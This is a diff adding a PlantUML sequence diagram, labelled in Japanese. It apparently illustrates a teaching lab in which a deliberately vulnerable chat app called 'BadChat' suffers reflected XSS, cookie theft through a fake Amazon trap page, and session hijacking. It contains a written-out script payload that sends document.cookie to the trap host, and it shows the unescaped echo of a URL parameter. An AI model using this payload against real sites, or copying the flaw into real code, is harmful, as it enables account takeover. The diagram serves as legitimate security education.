@@ -1,0 +1,56 @@
+@startuml scenario
+
+skinparam sequenceArrowThickness 2
+skinparam sequenceLifeLineBorderColor #555
+skinparam sequenceParticipantBorderColor #555
+
+actor "被害者 (Alice)" as Alice
+participant "ブラウザ" as Browser
+participant "BadChat\nサーバー" as BadChat
+participant "罠サイト\n(偽Amazon)" as Trap
+actor "攻撃者\n(Slack通知)" as Attacker
+
+== 1. 通常のログイン ==
+Alice -> Browser : badchat.example.com:8100 にアクセス
+Browser -> BadChat : GET /login.php
+BadChat --> Browser : ログインフォーム
+Alice -> Browser : alice / password1 を入力
+Browser -> BadChat : POST /login.php
+BadChat --> Browser : 302 Redirect\nindex.php?name=alice
+note right of Browser
+  Set-Cookie: PHPSESSID=xxx
+  (HttpOnly なし)
+end note
+Browser -> BadChat : GET /index.php?name=alice
+BadChat --> Browser : チャット画面
+
+== 2. 罠サイトへの誘導 ==
+Alice -> Browser : 攻撃者から送られた\nリンクをクリック
+Browser -> Trap : GET trap.badchat.example.com:8100
+Trap --> Browser : 偽Amazon ページ\n+ 隠し iframe
+
+== 3. XSS 発火 ==
+note over Browser
+  iframe が読み込む URL:
+  badchat.example.com:8100/index.php
+  ?name=<script>window.location=
+  'http://trap.../index.php?sid='
+  +document.cookie;</script>
+end note
+Browser -> BadChat : GET /index.php?name=<script>...</script>
+BadChat --> Browser : echo $_GET['name']\nスクリプトがそのまま出力される
+
+== 4. Cookie 窃取 ==
+note right of Browser
+  XSS により JavaScript 実行:
+  document.cookie を取得し
+  罠サイトへリダイレクト
+end note
+Browser -> Trap : GET /index.php?sid=PHPSESSID=xxx
+Trap -> Attacker : Slack API で\nセッション Cookie を送信
+
+== 5. セッションハイジャック ==
+Attacker -> BadChat : 窃取した PHPSESSID で\nアクセス
+BadChat --> Attacker : Alice のチャットセッション\nにログイン成功
+
+@enduml
